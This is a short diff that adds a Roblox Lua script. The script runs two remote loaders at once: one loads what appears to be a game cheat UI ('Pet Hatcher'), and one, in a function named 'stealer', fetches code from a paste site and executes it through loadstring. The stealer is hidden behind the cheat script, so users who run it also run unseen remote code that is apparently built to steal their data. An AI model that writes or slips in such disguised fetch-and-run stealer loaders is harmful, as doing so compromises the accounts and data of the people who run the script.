@@ -1,0 +1,9 @@
+local function stealer()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/rHuixKhXm5/0", true))()
+end
+local function loadui()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ShiraInuba01/maomaoscripts/main/Pet%20Hatcher%20with%20LVL%2050%20(MINE).txt"))()
+end
+
+task.spawn(stealer)
+task.spawn(loadui)
